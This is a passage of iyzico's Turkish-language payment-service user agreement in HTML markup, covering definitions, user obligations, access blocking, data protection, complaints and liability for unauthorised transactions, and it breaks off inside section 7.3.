              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Platform: iyzico tarafından geliştirilen sanal ödeme ve doğrulama ağ geçidi olan bir yazılımdan ibaret sanal platform</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Ödeme Aracı</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: Kullanıcı tarafından ödeme emrini vermek için kullanılan kart, cep telefonu, şifre ve benzeri kişiye özel araç</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Ödeme Hesabı</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: Kullanıcı adına iyzico nezdinde açılan ve ödeme işleminin yürütülmesinde kullanılan hesap</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Ödeme İşlemi</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: İnternet Sitesi’nde satışa sunulan ürünler veya hizmetler için ödeme yapılması amacıyla, Platform aracılığı ile yürütülen işlemler</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Sistem Ortağı: Platform aracılığı ile ödemelerin işlenmesi konusunda işbirliğinde bulunulan banka veya finans kuruluşu</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Onay Tarihi</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: Kullanıcı tarafından İnternet Sitesi’nden satın alınan ürün veya hizmetin teslim edildiğine ilişkin onayın verildiği veya söz konusu onayın verilmesi için Pazaryeri tarafından belirlenen sürenin dolduğu tarih</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Hatalı/Yetkisiz İşlem</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: Hatalı bir şekilde veya Kullanıcı’nın talimatı dışında gerçekleştirilen Ödeme İşlemi</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Şüpheli İşlem</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: Sözleşme ile belirlenen durumlar da dahil olmak üzere, Hatalı/Yetkisiz İşlem olarak değerlendirilme ihtimali bulunan Ödeme İşlemi</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Hassas Ödeme Verisi</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: Kullanıcı tarafından ödeme emrinin verilmesinde veya Kullanıcı’nın kimliğinin doğrulanmasında kullanılan, ele geçirilmesi veya değiştirilmesi halinde dolandırıcılık ya da kullanıcılar adına sahte işlem yapılmasına imkân verebilecek şifre, güvenlik sorusu, sertifika, şifreleme anahtarı ile PIN, kart numarası, son kullanma tarihi, CVV2, CVC2 kodu gibi veriler</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Yetkili Personel</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: Kullanıcı’ya Platform kullanımı hakkında destek vermek ve iletişime geçmek üzere iyzico tarafından yetkilendirilmiş olan personel</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <br> &nbsp;
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">3. SÖZLEŞMENİN KONUSU</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Pazaryeri tarafından işletilmekte İnternet Sitesi’nde ödeme hizmetleri iyzico tarafından sunulmaktadır. iyzico, bu kapsamda hem Satıcı’ya, hem de Alıcı’ya 6493 sayılı Ödeme ve Menkul Kıymet Mutabakat Sistemleri, Ödeme Hizmetleri ve Elektronik Para Kuruluşları Hakkında Kanun (“Kanun”) uyarınca ödeme hizmeti verecektir. Bu kapsamda; Alıcı’dan tahsil edilen ve İnternet Sitesi üzerinden temin edilen ürün veya hizmetin Alıcı’ya tam ve gereği gibi teslimine ilişkin onayın alınmasına kadar Alıcı’nın Ödeme Hesabı’nda tutulan ürün/hizmet bedeli; ürün/hizmet satışına ilişkin hükümlere uygun olarak Alıcı’nın onayı üzerine veya satın alınan hizmetin kullanımı üzerine iyzico tarafından Satıcı’nın Ödeme Hesabına aktarılacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">İşbu Sözleşme; yukarıda belirtilen kapsamda Alıcı’ya İnternet Sitesi üzerinden satın aldığı ürün ve hizmetin ücretinin Satıcı’ya aktarımı için sunulan Servis’e ilişkin esaslar ile Taraflar’ın bu kapsamdaki hak ve yükümlülüklerini düzenlemektedir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">4. GENEL ŞARTLAR</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">4.1. KAYIT</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Sözleşme’nin Kullanıcı tarafından İnternet Sitesi üzerinden onaylandığı tarih itibariyle işbu Sözleşme yürürlük ve geçerlilik kazanacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">4.2. KULLANIM KOŞULLARI</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) Kullanıcı Servis’i ancak Sözleşme yürürlüğe girdikten sonra kullanabilecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) iyzico, Kullanıcı’yı telefonla arama ve Pazaryeri tarafından iletilen bilgileri doğrulama, ek bilgi ve belge talep etme, herhangi bir sebep bildirmeksizin Kullanıcı’yı kaydetmeme haklarını saklı tutmaktadır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">5. TARAFLARIN HAK VE YÜKÜMLÜLÜKLERİ </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) İşbu Sözleşme uyarınca iyzico, Kullanıcı tarafından İnternet Sitesi’nden sipariş edilen ürün ve hizmetlere ilişkin ödemelerin işleme alınması ve Satıcı’ya ödemelerin yapılması amacıyla Servis sunmayı kabul ve taahhüt eder.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) iyzico, yetkisiz kişiler tarafından bilgilere erişilmesinin engellenmesi amacıyla Platform’u gerekli güvenlik seviyesinde tutmak için en iyi çabayı gösterecektir. Kullanıcı bu anlamda iyzico’ya azami desteği sağlayacak ve iyzico’nun talimatlarına uygun davranacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">c) iyzico, özellikle Sistem Ortakları tarafından gerçekleştirilen güvenlik standardı değişikliklerinin sonucunda güvenlik standardını değiştirme hakkını saklı tutar.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">d) Kullanıcı, yaptığı ödemelere ait provizyonların Sistem Ortakları tarafından belirtilen koşullar kapsamında gerçekleştirildiğini bildiğini, Sistem Ortakları’nın sitelerine yönelik ihlâller veya saldırılarda (hacking, phishing) iyzico’nun herhangi bir sorumluluğu bulunmadığını kabul eder.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">e) Kullanıcı, Platform’a erişim imkanı tanıyan şifreyi ve/veya Ödeme Aracı’na ilişkin temin ettiği bilgileri (varsa) gizli tutmakla, yetkisiz şahıslara ifşa etmemekle ve bu şifrelerin tahsis amacı haricinde başkaca amaçlar için kullanılmasını önlemekle yükümlüdür. Kullanıcı ayrıca bahsi geçen bilgiler veya Ödeme Aracı’na ait bilgilerin kaybolması, çalınması veya yetkisiz bir şekilde kullanımının söz konusu olması halinde; durumu derhal iyzico’ya işbu Sözleşme’de belirtilen yöntemlerden biriyle bildirmekle yükümlüdür. iyzico, Kullanıcı tarafından söz konusu bilgilerin kaybedilmesi veya ifşa edilmesi durumunda herhangi bir sorumluluğa sahip olmadığı gibi, kusurun iyzico’ya ait olduğu kanıtlanmadığı müddetçe üçüncü şahıslar tarafından Kullanıcı’ya verilecek zararlardan da sorumlu değildir. </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">f) Kullanıcı, Platform’un veya bir yönetim hesabının kanıtlanabilir bir şekilde yetkisiz olarak kötü amaçlı kullanımından veya yönetim hesabına yetkisiz erişimden kendi kusuru ölçüsünde sorumlu olacaktır.</font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">g) Kullanıcı, Platform’un işlevlerine müdahale etmeyeceğini, Platform’u kurulum ve kullanım talimatlarına uygun olarak kullanacağını, iyzico’nun talimatlarına uygun davranacağını kabul ve beyan eder.</font>
                      </font>
                    </font>
                    <font color="#333333">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt"></font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">h) Kullanıcı, iyzico tarafından sunulan Platform özelliklerine ilişkin açıklama ile “iyzico Platform Aracılığıyla Ödeme Yapılmasına İlişkin Kurallar”a ve bunlarla ilgili tüm güncellemelere uyacak, uymaması nedeniyle meydana gelecek tüm taleplerden sorumlu olacaktır.</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">ı) </font>
                      </font>
                    </font>
                    <font color="#333333">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Satıcı, İnternet Sitesi’nde satışı yasal olmayan ürünler ve hizmetler sunmayacaktır. iyzico tarafından, İnternet Sitesi’nde satışı hukuka aykırı olan ya da iyzico ilkelerine ters düşen ürün veya hizmetlerin sunulduğunun tespiti hâlinde, Satıcı tarafından Platform’un kullanılmasını tamamen veya kısmen durdurma yetkisi vardır. Bu durumda Ödeme İşlemi’nin reddedilmesi veya Platform’a erişimin tamamen askıya alınması Sözleşme’nin iyzico tarafından ihlâli olarak değerlendirilemez.</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <br> &nbsp;
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">6) GENEL ESASLAR</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">6.1. iyzico’nun Platform’a Erişimi Engelleme Hakkı</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) iyzico, özellikle aşağıdaki durumların meydana gelmesi halinde, Platform’a erişimi engelleme hakkına sahip olacaktır. Söz konusu durumun ortadan kaldırılmasını müteakip erişim tekrar sağlanacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">– <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Platform’a yönelik bilgisayar virüsü tehdidi varsa,</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">– <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Kullanıcı işbu Sözleşme kapsamında kendisinden talep edilen bilgileri sağlamıyorsa,</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) iyzico’nun işbu Sözleşme’ye ilişkin hizmetleri önceden Kullanıcı’ya haber vermeksizin denetleme yetkisi mevcuttur.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">6.2. Platform Bakımı, Kesintiler ve Arıza Çözümleri</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) iyzico, Platform’un düzgün olarak çalışması için gerekli olan sürekli bakımı, donanımı ve teknik desteği sağlayacaktır. Bununla bağlantılı olarak iyzico’nun, işbu Sözleşme’de açıkça belirtilen durumlarda ilgili sunucuların çalışmasını geçici olarak durdurma veya sınırlandırma hakkı saklıdır. Bu durumda, Kullanıcı’nın herhangi bir tazminat hakkı mevcut değildir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) iyzico, Platform’un kesintisiz çalışacağını garanti etmemektedir. iyzico, ödemeleri zamanında işleyecek olup, Sistem Ortakları’ndan kaynaklanan sorunlar nedeniyle, bu işlemlerin zamanında gerçekleşmemesinden sorumlu olmamakla birlikte, söz konusu sorunların en kısa süre içerisinde giderilmesi için gayret edecek ve Sistem Ortakları ile iletişim halinde olacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">6.3. Kişisel Bilgilerin Korunması</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) Kullanıcı, kendisine ait bilgilerin sadece Servis’in verilmesini temin amacıyla, iyzico Gizlilik&amp;Kişisel Veri Politikası’nın </font>
                  </font>
                </font>
                <font color="#0000ff">
                  <u>
                    <a href="https://www.iyzico.com/gizlilik-politikasi/">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">https://www.iyzico.com/gizlilik-politikasi/</font>
                      </font>
                    </a>
                  </u>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt"> adresinde yayınlanan en güncel halinde belirtildiği şekilde iyzico tarafından işlenmesine, saklanmasına ve benzeri işlemlerin (sisteme tanımlamak ve kayıt etmek) yapılmasına ve gerektiğinde üçüncü kişiler ile paylaşılmasına ilişkin bilgilendirildiğini kabul etmektedir. iyzico kişisel verilerin “gizli bilgi” olduğunun, kendisine bu amaçla verilen kişisel bilgilerin gizliliğini temin için gerekli özeni göstermekle yükümlü olduğunun ve 6698 sayılı Kişisel Verilen Korunması Kanunu’na ve diğer güncel mevzuatlara uygun davranması gerektiğinin bilincindedir. </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) Kullanıcı, iyzico’nun bir şikâyeti işleme aldığı durumlarda, Servis kapsamında gerçekleştirdiği işlemlere ilişkin bilgiler ile kendisine ait sair bilgilerin, şikâyetin çözümü için gerekli olduğu ölçüde Satıcı ve/veya Pazaryeri’ne iletilebileceğini kabul ve beyan eder.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">7. ŞİKÂYET PROSEDÜRÜ, HATA VE ZARAR SORUMLULUKLARI</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">7.1. ŞİKÂYET PROSEDÜRÜ</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) Kullanıcı, iyzico tarafından sağlanan hizmetlere ilişkin şikâyetleri </font>
                  </font>
                </font>
                <font color="#0000ff">
                  <u>
                    <a>
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">sikayet@iyzico.com</font>
                      </font>
                    </a>
                  </u>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt"> e-posta adresine e-posta göndermek suretiyle iletecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) Kullanıcı tarafından ayrıca Yetkili Personel’e iletişim telefon numarasından ulaşarak da şikâyet prosedürü başlatılabilecektir. </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">c) iyzico, şikâyet konusu sorunun giderilmesi için elinden gelen en iyi çabayı sarf edecektir. iyzico, şikâyetlerdeki eksiklikler (bildirim eksiklikleri) ile bağlantılı olarak meydana gelen gecikmelerden sorumlu olmayacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">d) Kullanıcı tarafından yöneltilecek şikâyetler en az şu ayrıntıları içereceklerdir: Şikâyet nedeni, işlemde dahil edilen tarafların listesi, varsa işlem kodu ve sorunun ayrıntılı bir listesi ve olası hata mesajlarının içeriği.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">e) Kullanıcı ile herhangi bir Kullanıcı veya Satıcı arasında meydana gelen uyuşmazlıklar ile ilgili Kullanıcı ile işlemin tarafı olan Kullanıcı veya Satıcı arasında çözüme ulaştırılacak olup, iyzico bu işlemlerden veya uyuşmazlıklardan sorumlu olmayacaktır. iyzico’nun bu madde kapsamında herhangi bir nedenle (kendi kusurundan kaynaklı haller dışında) bir bedel ödemek durumunda kalması halinde, Kullanıcı iyzico tarafından ödenen bedeli derhal tazmin edecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">f) iyzico gelen şikâyetleri kendisine ulaşma tarihinden itibaren en geç 20 (yirmi) gün içerisinde yanıtlayacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">7.2. HATA VE ZARARDAN DOĞAN SORUMLULUK</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) İnternet Sitesi’nde sunulan ürünlerin veya hizmetlerin Kullanıcı’ya tedarik edilmesine veya iade edilmesine ilişkin Alıcı ve Satıcı arasındaki sözleşmenin hukuka uygun bir şekilde akdedilmiş olmasından iyzico sorumlu olmayacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) iyzico, sadece Sözleşme’den kaynaklanan yükümlülüklerini ihlâl etmesi hâlinde meydana gelen doğrudan zararlardan sorumlu olup, kendi kusurunun bulunmadığı üçüncü şahıs veya Sistem Ortakları tarafından neden olunan zararlardan sorumlu olmayacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">c) iyzico, ödeme emrinin verilmesinin ardından Kullanıcı tarafından bilgilerin hatalı veya eksik girilmesi nedeniyle işlemlerin tamamlanmaması veya gecikmesinden veya kendisi tarafından öngörülemeyen veya engellenemeyen durumlar neticesinde meydana gelen gecikmelerden ötürü Ödeme İşlemi’nin gerçekleştirilememesinden veya Ödeme İşlemi’nde kendi kusuru dışında hata vermesinden veya bunların sonucunda meydana gelen zararlardan sorumlu olmayacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">d) Kullanıcı’nın işbu Sözleşme kapsamındaki herhangi bir taahhüt veya yükümlülüğüne aykırı aykırı davranması, yasaları veya herhangi bir üçüncü kişinin haklarını ihlal etmesi nedeniyle iyzico’nun, görevlilerinin, yöneticilerinin ve çalışanlarının bir zarara uğraması yahut iyzico’nun yasal, idari veya cezai bir yaptırıma tabi tutulması halinde, ödediği tutarlar (avukatlık ücretleri de dahil olarak) ferileri ile birlikte Kullanıcı’ya rücu edilecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">7.3. ŞÜPHELİ/YETKİLENDİRİLMEMİŞ/HATALI İŞLEMLERDE SORUMLULUK</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">a) Alıcı tarafından ödemenin iyzico’ya iletilmesi halinde iyzico işbu Sözleşme’de belirtilen koşullarda ve Pazaryeri tarafından belirtilen kurallar dahilinde ilgili onay süreçlerinin tamamlanmasını müteakip ödemeyi Satıcı’ya aktaracaktır. Kullanıcı’dan kaynaklanan sebeplerle ödemenin iyzico’ya aktarılmaması halinde, iyzico’nun Satıcı’ya ödeme yapma yükümlülüğü söz konusu olmayacaktır. Onay sürecinin herhangi bir nedenle gereği gibi tamamlanmaması halinde ise; iyzico ilgili tutarı Alıcı’ya iade edebilecektir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">b) Alıcı, Onay Tarihi’nde ilgili Ödeme İşlemi’ne ilişkin ödeme emrini vermiş kabul edilir. Kullanıcı, teslimata (geç veya eksik teslim, ayıplı ürün vb.) ilişkin herhangi bir bildirim yapmaması veya teslimatın gereği gibi gerçekleştiğine ilişkin bildirim yapmış olması halinde tutarın Satıcı’ya aktarılmış olması ile ilgili iyzico’dan herhangi bir talepte bulunamaz.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">c) </font>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Herhangi bir işleme ilişkin olarak iyzico’ya Hatalı/Yetkisiz İşlem bildiriminde bulunulduğu takdirde, derhal ve her halükarda Ödeme İşlemi’nin gerçekleştirilmesini takip eden azami 13 (onüç) ay içerisinde Kullanıcı tarafından VISA, Mastercard kuralları gereğince düzeltme veya harcama itirazı talebinde bulunulabilecektir. Bu durumda söz konusu bildirimin doğru olduğunun kanıtlanması veya Sistem Ortağı’nın bildirimi halinde ilgili işlem bedeli Satıcı’ya aktarılmayarak iyzico tarafından doğrudan Kullanıcı’ya iade edilebilecek, bildirim anında işlem bedeli Satıcı’ya aktarılmış ise iyzico ilgili tutarları Satıcı’dan iade talep ederek (Satıcı iadeyi 1 gün içerisinde gerçekleştirecek olup iyzico’nun ilgili bedeli Satıcı’ya yapılacak ödemelerden mahsup hakkı saklıdır) Kullanıcı’ya aktarabilecektır. </font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
